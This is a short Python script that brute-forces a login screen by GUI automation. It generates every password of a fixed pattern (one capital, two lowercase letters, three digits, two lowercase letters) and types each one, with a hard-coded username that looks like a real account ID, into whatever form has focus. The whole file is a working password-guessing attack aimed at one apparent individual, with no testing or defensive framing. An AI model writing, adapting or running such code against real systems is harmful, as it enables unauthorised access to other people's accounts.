import pyautogui
import time
import itertools
import string

def generate_passwords():
    uppercase = string.ascii_uppercase  # A-Z
    lowercase = string.ascii_lowercase  # a-z
    digits = string.digits  # 0-9

    for first_letter in uppercase:
        for second_part in itertools.product(lowercase, repeat=2):
            for third_part in itertools.product(digits, repeat=3):
                for fourth_part in itertools.product(lowercase, repeat=2):
                    yield first_letter + ''.join(second_part) + ''.join(third_part) + ''.join(fourth_part)

def brute_force_login(username):
    for password in generate_passwords():
        # Clear the input fields if needed (e.g., backspace multiple times)
        pyautogui.press('backspace', presses=20)
        
        # Enter username
        pyautogui.write(username)
        time.sleep(0.5)

        # Tab to the password field
        pyautogui.press('tab')
        time.sleep(0.5)

        # Enter the password
        pyautogui.write(password)
        time.sleep(0.5)

        # Press Enter to submit
        pyautogui.press('enter')
        time.sleep(1)  # Adjust based on response time

        # Check for success manually or through visual feedback
        print(f"Tried password: {password}")

        # Optional: break loop if you identify success manually
        # Example condition: Stop when login succeeds
        # if detect_success(): 
        #     print(f"Password found: {password}")
        #     return

if __name__ == "__main__":
    input("Place your cursor on the username field and press Enter to start...")
    brute_force_login("e2204767")
